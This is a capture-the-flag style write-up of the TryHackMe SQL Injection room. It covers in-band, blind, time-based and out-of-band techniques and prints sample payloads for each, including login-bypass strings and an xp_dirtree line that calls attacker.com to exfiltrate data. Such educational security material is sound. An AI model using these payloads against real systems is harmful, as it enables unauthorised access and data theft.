# SQL Injection (TryHackMe)

🔗 Room Name: SQL Injection  
🧠 Difficulty: Medium  
📁 Category: Web Exploitation

---

## 📝 Overview

This room provides a comprehensive introduction to different types of **SQL injection (SQLi)** attacks. It explores both in-band and blind SQLi techniques, teaching how to extract sensitive data from vulnerable web applications.

---

## 🛠️ Tools & Techniques Used

- In-Band SQL Injection  
- Blind SQL Injection – Authentication Bypass  
- Blind SQL Injection – Boolean-Based  
- Blind SQL Injection – Time-Based  
- Out-of-Band (OOB) SQL Injection

---

## 🧪 Learning Objectives

- Understand how SQL queries can be manipulated through input fields  
- Perform authentication bypasses via SQL injection  
- Enumerate databases, tables, and columns using different SQLi techniques  
- Identify blind SQL injection vulnerabilities using logic and timing  
- Grasp the concept of out-of-band data exfiltration in rare SQLi scenarios

---

## 🔍 Key Techniques Practised

### ✅ In-Band SQL Injection

Basic injection using error messages or output display:

```sql
' OR '1'='1
' UNION SELECT null, version()--

✅ Blind SQLi – Authentication Bypass
Bypass login using conditional logic:
' OR 1=1--

✅ Blind SQLi – Boolean-Based
Infer true/false conditions by observing response behaviour:
' AND 1=1--     -- True
' AND 1=2--     -- False

✅ Blind SQLi – Time-Based
Use SQL sleep/delay functions to infer data:

' OR IF(1=1, SLEEP(5), 0)--

✅ Out-of-Band SQLi
Trigger DNS or HTTP-based interactions for data exfiltration (less common):
'; EXEC xp_dirtree('//attacker.com/share')--

🎯 Key Takeaways
SQL injection remains a critical web vulnerability and is often easy to test for.

Blind SQLi requires creative logic and careful analysis of the application’s behaviour.

Out-of-band techniques are powerful but rely on specific database configurations and network conditions.

Input validation and parameterised queries are essential for preventing SQLi.

⚠️ Ethical Notice
This write-up is for educational purposes only. It respects the rules of TryHackMe and does not reveal solutions or flags.



